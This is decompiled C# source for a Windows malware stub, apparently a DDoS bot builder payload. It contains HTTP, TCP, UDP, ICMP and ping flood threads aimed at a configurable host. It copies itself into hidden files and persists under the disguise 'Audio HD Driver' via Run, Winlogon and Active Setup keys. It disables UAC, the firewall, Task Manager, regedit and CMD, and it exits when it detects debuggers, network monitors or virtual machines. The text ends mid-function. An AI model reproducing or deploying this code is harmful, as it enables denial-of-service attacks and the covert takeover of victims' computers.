using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Stub : Form
{
	private class Class0
	{
		public static string string_0;

		public static int int_0;

		private static Thread[] thread_0;

		public static void smethod_0()
		{
			thread_0 = new Thread[int_0];
			for (int i = 0; i < int_0; i++)
			{
				thread_0[i] = new Thread(smethod_2);
				thread_0[i].Start();
			}
		}

		public static void smethod_1()
		{
			for (int i = 0; i < int_0; i++)
			{
				try
				{
					thread_0[i].Abort();
					thread_0[i].Suspend();
				}
				catch
				{
					thread_0[i].Suspend();
				}
			}
		}

		private static void smethod_2()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						WebClient webClient = new WebClient();
						webClient.DownloadString(string_0);
					}
				}
				catch
				{
				}
			}
		}

		public Class0()
		{
			Class6.smethod_0();
			base._002Ector();
		}
	}

	private class Class1
	{
		public static string string_0;

		public static int int_0;

		public static int int_1;

		private static Thread[] thread_0;

		public static void smethod_0()
		{
			thread_0 = new Thread[int_1];
			for (int i = 0; i < int_1; i++)
			{
				thread_0[i] = new Thread(smethod_3);
				thread_0[i].Start();
			}
		}

		public static void smethod_1()
		{
			for (int i = 0; i < int_1; i++)
			{
				try
				{
					thread_0[i].Abort();
					thread_0[i].Suspend();
				}
				catch
				{
					thread_0[i].Suspend();
				}
			}
		}

		public static void smethod_2(object object_0)
		{
		}

		private static void smethod_3()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						Socket socket = new Socket(Dns.GetHostEntry(string_0).AddressList[0].AddressFamily, SocketType.Stream, ProtocolType.Tcp);
						socket.BeginConnect(Dns.GetHostEntry(string_0).AddressList[0].ToString(), 80, smethod_2, socket);
						Thread.Sleep(10);
						socket.Close();
					}
				}
				catch
				{
				}
			}
		}

		public Class1()
		{
			Class6.smethod_0();
			base._002Ector();
		}
	}

	private class Class2
	{
		public static string string_0;

		public static int int_0;

		public static int int_1;

		public static int int_2;

		private static Thread[] thread_0;

		public static void smethod_0()
		{
			thread_0 = new Thread[int_2];
			for (int i = 0; i < int_2; i++)
			{
				thread_0[i] = new Thread(smethod_2);
				thread_0[i].Start();
			}
		}

		public static void smethod_1()
		{
			for (int i = 0; i < int_2; i++)
			{
				try
				{
					thread_0[i].Abort();
					thread_0[i].Suspend();
				}
				catch
				{
					thread_0[i].Suspend();
				}
			}
		}

		private static void smethod_2()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						UdpClient udpClient = new UdpClient();
						byte[] array = new byte[int_1];
						udpClient.Send(array, array.Length, Dns.GetHostEntry(string_0).AddressList[0].ToString(), int_0);
						udpClient.Close();
					}
				}
				catch
				{
				}
			}
		}

		public Class2()
		{
			Class6.smethod_0();
			base._002Ector();
		}
	}

	private class Class3
	{
		public static string string_0;

		public static int int_0;

		public static int int_1;

		public static int int_2;

		private static Thread[] thread_0;

		public static void smethod_0()
		{
			thread_0 = new Thread[int_2];
			for (int i = 0; i < int_2; i++)
			{
				thread_0[i] = new Thread(smethod_2);
				thread_0[i].Start();
			}
		}

		public static void smethod_1()
		{
			for (int i = 0; i < int_2; i++)
			{
				try
				{
					thread_0[i].Abort();
					thread_0[i].Suspend();
				}
				catch
				{
					thread_0[i].Suspend();
				}
			}
		}

		private static void smethod_2()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						TcpClient tcpClient = new TcpClient(string_0, int_0);
						NetworkStream stream = tcpClient.GetStream();
						byte[] array = new byte[int_1];
						stream.Write(array, 0, array.Length);
						stream.Close();
						tcpClient.Close();
					}
				}
				catch
				{
				}
			}
		}

		public Class3()
		{
			Class6.smethod_0();
			base._002Ector();
		}
	}

	private class Class4
	{
		public static string string_0;

		public static int int_0;

		public static int int_1;

		public static int int_2;

		private static Thread[] thread_0;

		public static void smethod_0()
		{
			thread_0 = new Thread[int_2];
			for (int i = 0; i < int_2; i++)
			{
				thread_0[i] = new Thread(smethod_2);
				thread_0[i].Start();
			}
		}

		public static void smethod_1()
		{
			for (int i = 0; i < int_2; i++)
			{
				try
				{
					thread_0[i].Abort();
					thread_0[i].Suspend();
				}
				catch
				{
					thread_0[i].Suspend();
				}
			}
		}

		private static void smethod_2()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
						byte[] buffer = new byte[int_1];
						socket.SendTo(buffer, new IPEndPoint(Dns.GetHostEntry(string_0).AddressList[0], int_0));
						socket.Close();
					}
				}
				catch
				{
				}
			}
		}

		public Class4()
		{
			Class6.smethod_0();
			base._002Ector();
		}
	}

	private class Class5
	{
		public static string string_0;

		public static int int_0;

		public static int int_1;

		private static Thread[] thread_0;

		public static void smethod_0()
		{
			thread_0 = new Thread[int_1];
			for (int i = 0; i < int_1; i++)
			{
				thread_0[i] = new Thread(smethod_2);
				thread_0[i].Start();
			}
		}

		public static void smethod_1()
		{
			for (int i = 0; i < int_1; i++)
			{
				try
				{
					thread_0[i].Abort();
					thread_0[i].Suspend();
				}
				catch
				{
					thread_0[i].Suspend();
				}
			}
		}

		private static void smethod_2()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						Ping ping = new Ping();
						PingOptions pingOptions = new PingOptions();
						pingOptions.DontFragment = false;
						byte[] buffer = new byte[int_0];
						ping.Send(Dns.GetHostEntry(string_0).AddressList[0], 1000, buffer, pingOptions);
					}
				}
				catch
				{
				}
			}
		}

		public Class5()
		{
			Class6.smethod_0();
			base._002Ector();
		}
	}

	private static GClass0 gclass0_0;

	private static string string_0;

	private static string string_1;

	private static bool bool_0;

	private static bool bool_1;

	private static bool bool_2;

	private static bool bool_3;

	private static bool bool_4;

	private static bool bool_5;

	private static bool bool_6;

	private static bool bool_7;

	private static bool bool_8;

	private static bool bool_9;

	private static bool bool_10;

	private static bool bool_11;

	private static bool bool_12;

	private static bool bool_13;

	private static bool bool_14;

	private static string string_2;

	private static bool bool_15;

	private static bool bool_16;

	private static string string_3;

	private static string string_4;

	private static bool bool_17;

	private static string string_5;

	private static bool bool_18;

	private static bool bool_19;

	private static bool bool_20;

	private static bool bool_21;

	private static bool bool_22;

	private static string string_6;

	private static string string_7;

	private static string string_8;

	private static string string_9;

	private static string string_10;

	private static string string_11;

	public Stub()
	{
		Class6.smethod_0();
		((Form)this)._002Ector();
		InitializeComponent();
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Stub");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_Closing((CancelEventHandler)Stub_Closing);
		((Form)this).add_Load((EventHandler)Stub_Load);
		((Control)this).ResumeLayout(false);
	}

	private static void Main(string[] args)
	{
		Application.Run((Form)(object)new Stub());
	}

	private void Stub_Closing(object sender, CancelEventArgs e)
	{
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("Hidden", "2", RegistryValueKind.DWord);
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2);
			Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2);
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run");
			if (registryKey == null)
			{
				registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run");
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_2);
			}
			else
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_2);
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run");
			if (registryKey2 == null)
			{
				registryKey2 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run");
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2);
			}
			else
			{
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2);
			}
		}
		catch
		{
		}
		try
		{
			Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true)!.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe," + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_2);
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Active Setup\\Installed Components\\{83313942-b21e-454e-b5ae-d01992a63ad5}");
			if (registryKey3 == null)
			{
				registryKey3 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Active Setup\\Installed Components\\{83313942-b21e-454e-b5ae-d01992a63ad5}");
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Active Setup\\Installed Components\\{83313942-b21e-454e-b5ae-d01992a63ad5}", writable: true)!.SetValue("StubPath", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2);
			}
			else
			{
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Active Setup\\Installed Components\\{83313942-b21e-454e-b5ae-d01992a63ad5}", writable: true)!.SetValue("StubPath", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2);
			}
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (registryKey4 == null)
			{
				registryKey4 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			}
			else
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			}
			Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
		}
		catch
		{
		}
		if (bool_19)
		{
			RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System");
			if (registryKey5 == null)
			{
				registryKey5 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
				Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true)!.SetValue("DisableCMD", "2", RegistryValueKind.DWord);
			}
			else
			{
				Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true)!.SetValue("DisableCMD", "2", RegistryValueKind.DWord);
			}
		}
		if (bool_20)
		{
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = "Netsh";
				process.StartInfo.Arguments = "Advfirewall set Currentprofile State off";
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
			}
			catch
			{
			}
		}
		if (bool_21)
		{
			try
			{
				RegistryKey registryKey6 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				if (registryKey6 == null)
				{
					registryKey6 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
				}
				else
				{
					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
				}
			}
			catch
			{
			}
		}
		if (!bool_22)
		{
			return;
		}
		try
		{
			RegistryKey registryKey7 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (registryKey7 == null)
			{
				registryKey7 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
			}
			else
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static string smethod_0(string string_12, string string_13)
	{
		ServicePointManager.Expect100Continue = false;
		WebRequest webRequest = WebRequest.Create(string_12);
		webRequest.ContentType = "application/x-www-form-urlencoded";
		webRequest.Method = "POST";
		byte[] bytes = Encoding.ASCII.GetBytes(string_13);
		webRequest.ContentLength = bytes.Length;
		Stream requestStream = webRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = webRequest.GetResponse();
		if (response == null)
		{
			return null;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	private static string smethod_1()
	{
		return smethod_2() + smethod_4() + smethod_3() + smethod_5() + smethod_6();
	}

	private static string smethod_2()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor WHERE DeviceID = 'CPU0'");
		string result = "";
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item("ProcessorId"));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static string smethod_3()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
		string result = "";
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item("Description"));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static string smethod_4()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BaseBoard");
		string result = "";
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item("SerialNumber"));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static string smethod_5()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem");
		string text = "";
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = Convert.ToString(((ManagementBaseObject)val2).get_Item("Caption")) + "(" + Convert.ToString(((ManagementBaseObject)val2).get_Item("OSArchitecture")) + ")";
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return text.Replace("Microsoft ", "").Replace("-", " ");
	}

	private static string smethod_6()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BIOS");
		string result = "";
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item("SMBIOSBIOSVersion"));
				result += Convert.ToString(((ManagementBaseObject)val2).get_Item("Name"));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static string smethod_7(string string_12)
	{
		if (string_12 != null && string_12.Length != 0)
		{
			MD5 mD = new MD5CryptoServiceProvider();
			byte[] bytes = Encoding.Default.GetBytes(string_12);
			byte[] array = mD.ComputeHash(bytes);
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < array.Length; i++)
			{
				stringBuilder.Append(array[i].ToString("x2"));
			}
			return stringBuilder.ToString();
		}
		return string.Empty;
	}

	public static bool smethod_8(string string_12)
	{
		return Process.GetProcessesByName(string_12).Length > 0;
	}

	public static void smethod_9()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(string_4, string_3, (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static void smethod_10()
	{
		Environment.Exit(0);
	}

	private void Stub_Load(object sender, EventArgs e)
	{
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Expected O, but got Unknown
		bool createdNew = false;
		new Mutex(initiallyOwned: true, "rqwzUuvyI8h", out createdNew);
		if (!createdNew)
		{
			smethod_10();
		}
		if (bool_16)
		{
			try
			{
				Thread thread = new Thread(smethod_9);
				thread.Start();
			}
			catch
			{
			}
		}
		if (bool_0)
		{
			try
			{
				if (Debugger.IsAttached)
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_1)
		{
			try
			{
				long num = 0L;
				long num2 = 0L;
				num = DateTime.Now.Ticks;
				Thread.Sleep(10);
				num2 = DateTime.Now.Ticks;
				if (num2 - num < 10L)
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_2)
		{
			try
			{
				if (smethod_8("NETSTAT"))
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_3)
		{
			try
			{
				Form val = new Form();
				((Control)val).set_Text("TEST");
				val.set_Opacity(0.0);
				val.set_ShowInTaskbar(false);
				((Control)val).Show();
				if (((Control)val).get_Text() == "[#] TEST [#]")
				{
					smethod_10();
				}
				val.Close();
			}
			catch
			{
			}
		}
		if (bool_4)
		{
			try
			{
				if (smethod_8("FILEMON"))
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_5)
		{
			try
			{
				if (smethod_8("PROCMON"))
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_6)
		{
			try
			{
				if (smethod_8("REGMON"))
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_7)
		{
			try
			{
				if (smethod_8("CAIN"))
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_8)
		{
			try
			{
				if (smethod_8("NETMON"))
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_9)
		{
			try
			{
				if (smethod_8("TCPVIEW"))
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_10)
		{
			try
			{
				if (smethod_8("WIRESHARK"))
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_11)
		{
			try
			{
				string text = smethod_3();
				if (text == "Parallels Video Adapter")
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_12)
		{
			try
			{
				string text2 = smethod_3();
				if (text2 == "VMware SVGA II")
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_13)
		{
			try
			{
				string text3 = smethod_3();
				if (text3 == "VirtualBox Graphics Adapter")
				{
					smethod_10();
				}
			}
			catch
			{
			}
		}
		if (bool_14)
		{
			try
			{
				string[] array = new string[2] { "VM Additions S3 Trio32/64", "S3 Trio32/64" };
				for (int i = 0; i < array.Length; i++)
				{
					string text4 = smethod_3();
					if (text4 == array[i])
					{
						smethod_10();
					}
				}
			}
			catch
			{
			}
		}
		if (bool_17)
		{
			try
			{
				Thread.Sleep(Convert.ToInt32(string_5) * 1000);
			}
			catch
			{
			}
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("Hidden", "2", RegistryValueKind.DWord);
		}
		catch
		{
		}
		try
		{
			string fileName = Process.GetCurrentProcess().MainModule!.FileName;
			FileStream fileStream = new FileStream(fileName, FileMode.Open, FileAccess.Read);
			byte[] array2 = new byte[fileStream.Length];
			fileStream.Read(array2, 0, array2.Length);
			fileStream.Close();
			FileStream fileStream2 = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2, FileMode.Create);
			fileStream2.Write(array2, 0, array2.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			FileStream fileStream3 = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_2, FileMode.Create);
			fileStream3.Write(array2, 0, array2.Length);
			fileStream3.Close();
			fileStream3.Dispose();
			File.SetAttributes(Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2, FileAttributes.Hidden);
			File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_2, FileAttributes.Hidden);
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2);
			Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2);
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run");
			if (registryKey == null)
			{
				registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run");
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_2);
			}
			else
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_2);
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run");
			if (registryKey2 == null)
			{
				registryKey2 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run");
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2);
			}
			else
			{
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue("Audio HD Driver", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2);
			}
		}
		catch
		{
		}
		try
		{
			Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true)!.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe," + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_2);
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Active Setup\\Installed Components\\{83313942-b21e-454e-b5ae-d01992a63ad5}");
			if (registryKey3 == null)
			{
				registryKey3 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Active Setup\\Installed Components\\{83313942-b21e-454e-b5ae-d01992a63ad5}");
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Active Setup\\Installed Components\\{83313942-b21e-454e-b5ae-d01992a63ad5}", writable: true)!.SetValue("StubPath", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2);
			}
			else
			{
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Active Setup\\Installed Components\\{83313942-b21e-454e-b5ae-d01992a63ad5}", writable: true)!.SetValue("StubPath", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2);
			}
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (registryKey4 == null)
			{
				registryKey4 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			}
			else
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			}
			Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
		}
		catch
		{
		}
		if (bool_19)
		{
			RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System");
			if (registryKey5 == null)
			{
				registryKey5 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
				Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true)!.SetValue("DisableCMD", "2", RegistryValueKind.DWord);
			}
			else
			{
				Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true)!.SetValue("DisableCMD", "2", RegistryValueKind.DWord);
			}
		}
		if (bool_20)
		{
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = "Netsh";
				process.StartInfo.Arguments = "Advfirewall set Currentprofile State off";
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
			}
			catch
			{
			}
		}
		if (bool_21)
		{
			try
			{
				RegistryKey registryKey6 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				if (registryKey6 == null)
				{
					registryKey6 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
				}
				else
				{
					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
				}
			}
			catch
			{
			}
		}
		if (bool_22)
		{
			try
			{
				RegistryKey registryKey7 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				if (registryKey7 == null)
				{
					registryKey7 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
